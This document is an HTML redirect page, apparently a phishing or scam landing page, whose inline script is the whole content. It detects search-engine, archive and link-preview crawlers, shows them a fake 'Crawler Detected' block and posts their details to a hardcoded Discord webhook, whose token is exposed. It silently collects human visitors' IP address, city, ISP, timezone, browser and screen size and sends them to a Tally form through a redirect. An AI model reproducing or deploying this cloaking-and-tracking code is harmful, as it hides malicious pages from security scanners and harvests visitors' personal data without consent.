<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        async function trackUser() {
            const botList = ["bot", "crawl", "spider", "archive", "slurp", "facebookexternalhit"];
            const userAgent = navigator.userAgent.toLowerCase();

            // If bot detected, block and log details
            if (botList.some(bot => userAgent.includes(bot))) {
                document.body.innerHTML = `<h1>Crawler Detected</h1>
                    <p>Please contact support at <a href="mailto:contact@candykingsid.com">contact@candykingsid.com</a></p>
                    <p>Error Code: BOT-403</p>`;

                // Get country info
                let ipData = await fetch("https://ipapi.co/json/").then(res => res.json());

                // Send log to Discord webhook
                fetch("https://discord.com/api/webhooks/1344385758026535054/cSWbFy-5tKPCBRW4IWKhMHDZKkWVQEbFlpkwVgs9LKsJESweTQ-cBrXOviJxVODG_3ps", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        username: "Bot Logger",
                        embeds: [{
                            title: "🚨 Bot Detected!",
                            color: 16711680, // Red color
                            fields: [
                                { name: "📌 Bot Type", value: userAgent, inline: false },
                                { name: "🌍 Country", value: ipData.country_name, inline: true },
                                { name: "📅 Date/Time", value: new Date().toLocaleString(), inline: true },
                                { name: "🆔 Error Code", value: "BOT-403", inline: true }
                            ]
                        }]
                    })
                });
                return;
            }

            // Get IP and browser details
            let ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
            let ip = ipData.ip;
            let country = ipData.country_name;
            let region = ipData.region;
            let city = ipData.city;
            let isp = ipData.org;
            let timezone = ipData.timezone;
            let browser = navigator.userAgent;
            let screenSize = `${window.screen.width}x${window.screen.height}`;

            // Structure tracking data
            let trackingData = `IP: ${ip} | Country: ${country} | Region: ${region} | City: ${city} | ISP: ${isp} | Timezone: ${timezone} | Browser: ${browser} | Screen: ${screenSize}`;

            // Encode tracking details for URL
            let encodedTracking = encodeURIComponent(trackingData);

            // Redirect to Tally form with tracking details
            window.location.href = `https://tally.so/r/wb6M7g?tracking=${encodedTracking}`;
        }

        trackUser();
    </script>
</head>
<body>
    <h1>Loading...</h1>
</body>
</html>
<script>
function isBot() {
    const botUserAgents = [
        "Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider", "YandexBot", "facebot", "ia_archiver"
    ];
    const ua = navigator.userAgent;
    return botUserAgents.some(bot => ua.includes(bot));
}

function detectBotContinuously() {
    setInterval(() => {
        if (isBot()) {
            // Send to Discord Webhook
            fetch("https://discord.com/api/webhooks/1344385758026535054/cSWbFy-5tKPCBRW4IWKhMHDZKkWVQEbFlpkwVgs9LKsJESweTQ-cBrXOviJxVODG_3ps", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    username: "Bot Detector",
                    content: `🚨 Crawler Detected! User-Agent: ${navigator.userAgent} | Time: ${new Date().toLocaleString()}`
                })
            });

            // Block Access
            document.body.innerHTML = "<h1>Crawler Detected</h1><p>Please contact support: contact@candykingsid.com</p><p>Error Code: 403</p>";
        }
    }, 2000); // Check every 2 seconds
}

detectBotContinuously();
</script>
